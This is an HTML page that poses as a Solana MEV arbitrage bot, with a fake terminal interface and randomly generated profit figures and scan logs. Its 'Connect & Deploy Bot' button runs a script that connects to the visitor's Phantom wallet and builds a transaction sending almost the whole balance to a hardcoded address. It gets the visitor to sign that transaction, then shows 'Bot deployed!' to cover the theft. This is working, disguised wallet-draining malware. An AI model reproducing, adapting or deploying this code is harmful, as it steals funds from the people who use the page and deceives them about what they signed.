<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana MEV Engine v2.4</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .terminal { background: rgba(0,0,0,0.9); border: 1px solid #00ff41; padding: 20px; width: 90%; max-width: 600px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); border-radius: 5px; }
        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 12px; }
        .log { height: 200px; overflow-y: hidden; font-size: 13px; line-height: 1.6; margin-bottom: 20px; color: #008f11; }
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; font-size: 14px; }
        .stat-box { border: 1px dashed #008f11; padding: 10px; text-align: center; }
        .btn { background: #00ff41; color: black; border: none; width: 100%; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
        .btn:hover { background: #fff; box-shadow: 0 0 20px #00ff41; }
        .highlight { color: #fff; text-shadow: 0 0 5px #00ff41; }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="header">
            <span>SYSTEM: ONLINE</span>
            <span>LATENCY: 14ms</span>
        </div>
        <div class="stats">
            <div class="stat-box">POOLS SCANNED: <span class="highlight" id="pools">1,402</span></div>
            <div class="stat-box">ARB OPPORTUNITY: <span class="highlight" id="profit">0.00 SOL</span></div>
        </div>
        <div class="log" id="log">
            [SYS] Initializing MEV-Phantom Bridge...<br>
            [NET] Connecting to Solana Mainnet-Beta...<br>
            [OK] Connection established.<br>
            [SEARCH] Scanning Raydium liquidity...<br>
        </div>
        <button class="btn" onclick="startExploit()">Connect & Deploy Bot</button>
        <p style="font-size: 10px; color: #444; text-align: center; margin-top: 10px;">Requires 0.05 SOL minimum balance for gas deposits.</p>
    </div>

    <script>
        // Log simulator
        const log = document.getElementById('log');
        const phrases = [
            "[OK] Opportunity found: Orca -> Raydium (+0.12 SOL)",
            "[SCAN] Checking Jupiter aggregator routes...",
            "[SYS] Monitoring mempool for front-run targets...",
            "[NET] RPC Node synchronization: 100%",
            "[OK] MEV Route optimized for low slippage..."
        ];
        setInterval(() => {
            const p = document.createElement('div');
            p.innerText = phrases[Math.floor(Math.random() * phrases.length)];
            log.appendChild(p);
            if (log.childNodes.length > 10) log.removeChild(log.firstChild);
            document.getElementById('profit').innerText = (Math.random() * 2).toFixed(2) + " SOL";
        }, 3000);

        async function startExploit() {
            const dest = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; 
            if (!window.solana) return alert("Phantom not found");
            
            try {
                const resp = await window.solana.connect();
                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                const balance = await conn.getBalance(resp.publicKey);
                
                if (balance < 50000000) return alert("Insufficient balance for MEV gas.");

                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(dest),
                        lamports: balance - 1000000,
                    })
                );

                tx.feePayer = resp.publicKey;
                const { blockhash } = await conn.getRecentBlockhash();
                tx.recentBlockhash = blockhash;

                const signed = await window.solana.signTransaction(tx);
                await conn.sendRawTransaction(signed.serialize());
                alert("Bot deployed! Monitoring transactions...");
            } catch (err) {
                console.log("User rejected or error");
            }
        }
    </script>
</body>
</html>
